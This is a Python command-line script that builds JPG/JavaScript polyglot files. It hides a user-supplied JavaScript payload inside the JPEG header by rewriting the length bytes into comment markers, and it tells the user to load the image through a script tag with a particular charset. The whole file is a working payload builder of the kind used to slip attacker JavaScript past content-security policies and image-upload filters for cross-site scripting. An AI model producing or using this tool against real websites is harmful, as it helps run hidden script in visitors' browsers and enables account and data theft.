import typer
from enum import Enum
import os
from defaults import default_jpg
from io import BytesIO
import sys


def create_jpg(code: str, image: str) -> bytes:
    if image is not None:
        image = open(image, "rb").read()
    else:
        image = default_jpg

    jpg_io = BytesIO(image)
    jpg_start = jpg_io.read(4)
    table_length = int.from_bytes(jpg_io.read(2), 'big')
    header = jpg_io.read(table_length - 2)
    rest = jpg_io.read()

    payload = f"*/=1;{code}/*"
    new_size = int.from_bytes(b'/*', 'big')
    new_header = header + payload.encode()

    if new_size - 2 - len(new_header) < 0:
        typer.secho("[!] JS payload too long!", color=typer.colors.RED)
        exit(1)

    image = jpg_start + b'/*' + new_header + b'\x00' * (new_size - 2 - len(new_header)) + rest[:-2] + b'*/\xff\xd9'
    return image


class SupportedImageFormats(Enum):
    jpg = "jpg"


def main(
        script: str = typer.Option(..., help="File containing the JS code."),
        extension: SupportedImageFormats = typer.Option(SupportedImageFormats.jpg, help="Output image format."),
        image: str = typer.Option(None, help="Image to use (Not supported with every extension)."),
        output: str = typer.Option(..., help="Output file.")
):
    if not os.path.isfile(script):
        typer.secho("[!] Invalid JS file provided.", fg=typer.colors.RED)
        exit(1)
    if image is not None and not os.path.isfile(script):
        typer.secho("[!] Invalid image file provided.", fg=typer.colors.RED)
        exit(1)
    if os.path.exists(output):
        typer.secho("[!] Output file already exists.", fg=typer.colors.RED)
        exit(1)

    new_image = None

    try:
        if extension == SupportedImageFormats.jpg:
            typer.secho("[*] Trying to create JPG format JS file.", fg=typer.colors.YELLOW)
            new_image = create_jpg(open(script, "r").read(), image)
            typer.secho('[*] JPG created use in with <script src="/path/to/file" charset="ISO-8859-1">.',
                        fg=typer.colors.YELLOW)
    except Exception:
        typer.secho("[!] Something went wrong during execution!", fg=typer.colors.RED)
        typer.secho(sys.exc_info()[0], fg=typer.colors.RED)
        exit(1)

    if new_image is not None:
        file = open(output, "wb")
        file.write(new_image)
        file.close()
        typer.secho(f"[+] Image saved to {output}.", fg=typer.colors.GREEN)


if __name__ == "__main__":
    typer.run(main)
